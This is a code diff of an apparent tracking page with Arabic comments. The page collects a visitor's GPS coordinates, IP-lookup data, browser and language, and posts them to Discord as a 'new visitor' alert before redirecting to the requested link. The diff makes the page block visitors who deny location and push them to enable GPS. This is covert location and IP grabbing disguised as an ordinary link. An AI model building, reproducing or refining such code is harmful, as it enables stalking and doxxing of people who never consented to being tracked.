@@ -51,7 +51,6 @@
     let latitude, longitude;
 
     try {
-      // محاولة الحصول على الموقع عبر GPS
       const position = await new Promise((resolve, reject) =>
         navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 })
       );
@@ -61,11 +60,12 @@
       locationInfo = `📍 GPS:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n`;
     } catch (e) {
       locationInfo = "📍 الموقع: المستخدم رفض أو لم يتم تحديد GPS\n";
-      alert("يرجى تفعيل الـ GPS لتتمكن من الدخول إلى الصفحة.");
-      return; // إذا كان الـ GPS غير مفعل، نوقف العملية هنا.
+      // إذا تم رفض الموقع أو لم يكن مفعلًا، ستظهر رسالة تطلب تفعيله
+      alert("يرجى تفعيل الـ GPS للمتابعة.");
+      window.location.href = "https://www.google.com/maps"; // تحويل المستخدم إلى خرائط جوجل لتفعيل الـ GPS
+      return; // إيقاف الكود هنا إذا لم يتم تفعيل GPS
     }
 
-    // جلب بيانات الـ IP عبر API
     const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
     const userAgent = navigator.userAgent;
     const lang = navigator.language;
@@ -74,7 +74,6 @@
 
     const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-    // صياغة الرسالة التي سيتم إرسالها إلى Discord
     const message = `
 🕵️‍♂️ زائر جديد دخل الموقع:
 
@@ -92,7 +91,6 @@ ${locationInfo}
 📍 الموقع على خرائط جوجل: [رابط الموقع](https://www.google.com/maps?q=${latitude},${longitude})
     `;
 
-    // إرسال البيانات إلى الـ Discord
     await sendToDiscord(message);
 
     // بعد إرسال البيانات، يتم تحويل المستخدم إلى الرابط المطلوب
